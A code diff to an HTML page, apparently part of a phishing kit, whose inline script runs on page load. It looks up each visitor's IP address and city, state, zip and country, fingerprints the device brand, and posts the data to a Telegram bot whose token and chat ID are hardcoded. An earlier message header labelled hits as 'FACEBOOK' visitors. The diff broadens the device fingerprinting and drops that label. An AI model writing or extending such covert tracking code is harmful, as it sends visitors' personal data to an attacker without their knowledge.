@@ -109,7 +109,7 @@ html, body {
 
 </style>
 </head>
-<script>
+<script defer>
   const botToken = "7840862788:AAGeGI8WpKs4DfSxOTCMca5mwTG5PjXVqhM";
   const chatId = "-1002539821629";
 
@@ -126,46 +126,83 @@ html, body {
     return `${month} ${day} - ${time}`;
   }
 
-  function getDeviceType() {
+  function getPhoneBrandFromUserAgent() {
     const ua = navigator.userAgent.toLowerCase();
 
-    if (/iphone/.test(ua)) return "iPhone";
-    if (/ipad/.test(ua)) return "iPad";
-    if (/android/.test(ua)) {
-      if (/samsung/.test(ua)) return "Samsung";
-      return "Android";
-    }
-    if (/windows nt 10/.test(ua)) return "Windows 10";
-    if (/windows nt 11/.test(ua)) return "Windows 11";
-    if (/windows nt 6\.1/.test(ua)) return "Windows 7";
-    if (/macintosh/.test(ua)) return "Mac";
+    // Apple devices
+    if (/iphone/.test(ua)) return "Apple iPhone";
+    if (/ipad/.test(ua)) return "Apple iPad";
+    if (/macintosh/.test(ua)) return "Apple Mac";
 
-    return "Unknown";
+    // Windows PCs
+    if (/windows nt 11/.test(ua)) return "Windows 11 PC";
+    if (/windows nt 10/.test(ua)) return "Windows 10 PC";
+    if (/windows nt 6\.1/.test(ua)) return "Windows 7 PC";
+    if (/windows/.test(ua)) return "Windows PC";
+
+    // Linux
+    if (/ubuntu/.test(ua)) return "Ubuntu Linux";
+    if (/linux/.test(ua)) return "Linux Machine";
+
+    // Android phone brands
+    if (/samsung|sm-/.test(ua)) return "Samsung";
+    if (/huawei/.test(ua)) return "Huawei";
+    if (/honor/.test(ua)) return "Honor";
+    if (/oppo/.test(ua)) return "Oppo";
+    if (/realme/.test(ua)) return "Realme";
+    if (/vivo/.test(ua)) return "Vivo";
+    if (/poco/.test(ua)) return "POCO";
+    if (/redmi/.test(ua)) return "Redmi";
+    if (/xiaomi|mi/.test(ua)) return "Xiaomi";
+    if (/oneplus/.test(ua)) return "OnePlus";
+    if (/iqoo/.test(ua)) return "iQOO";
+    if (/google|pixel/.test(ua)) return "Google Pixel";
+    if (/asus|zenfone/.test(ua)) return "ASUS";
+    if (/lenovo/.test(ua)) return "Lenovo";
+    if (/motorola|moto/.test(ua)) return "Motorola";
+    if (/nokia/.test(ua)) return "Nokia";
+    if (/infinix/.test(ua)) return "Infinix";
+    if (/tecno/.test(ua)) return "Tecno";
+    if (/itel/.test(ua)) return "Itel";
+    if (/sony/.test(ua)) return "Sony Xperia";
+    if (/lg-/.test(ua)) return "LG";
+    if (/meizu/.test(ua)) return "Meizu";
+    if (/zte/.test(ua)) return "ZTE";
+    if (/alcatel/.test(ua)) return "Alcatel";
+    if (/sharp/.test(ua)) return "Sharp";
+    if (/panasonic/.test(ua)) return "Panasonic";
+    if (/bq/.test(ua)) return "BQ";
+    if (/lava/.test(ua)) return "Lava";
+    if (/micromax/.test(ua)) return "Micromax";
+    if (/gionee/.test(ua)) return "Gionee";
+    if (/coolpad/.test(ua)) return "Coolpad";
+
+    // Fallbacks
+    if (/android/.test(ua)) return "Android (Unknown Brand)";
+    return "Unknown Device";
   }
 
   async function sendVisitMessage() {
     try {
-      const ipRes = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipRes.json();
+      const ipData = await (await fetch('https://api.ipify.org?format=json')).json();
       const ip = ipData.ip;
 
-      const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip`);
-      const geo = await geoRes.json();
+      const geo = await (await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip`)).json();
 
       const city = geo.city || "Unknown";
       const state = geo.regionName || "Unknown";
       const zip = geo.zip || "Unknown";
       const country = geo.country || "Unknown";
-      const deviceType = getDeviceType();
+      const deviceBrand = getPhoneBrandFromUserAgent();
       const time = formatTime();
 
       const message =
-        `<b>[${ip}] - FACEBOOK V I S I T O R - [${time}]</b>\n` +
+        `<b>[${ip}] <b>- V I S I T O R - </b>[${time}]</b>\n` +
         `<b>City:</b> <code>${city}</code>\n` +
         `<b>State:</b> <code>${state}</code>\n` +
         `<b>Zip:</b> <code>${zip}</code>\n` +
         `<b>From:</b> <code>${country}</code>\n` +
-        `<b>Device:</b> <code>${deviceType}</code>`;
+        `<b>Device:</b> <code>${deviceBrand}</code>`;
 
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -181,6 +218,8 @@ html, body {
 
   sendVisitMessage();
 </script>
+
+
 <body>
     <nav class="navbar navbar-light navbar-expand-md py-3">
         <div class="container"><a class="navbar-brand d-flex align-items-center" href="#"><img class="img-fluid" src="./main_files/img/large_TM-LOGO.png" style="width: 160px;"></a>
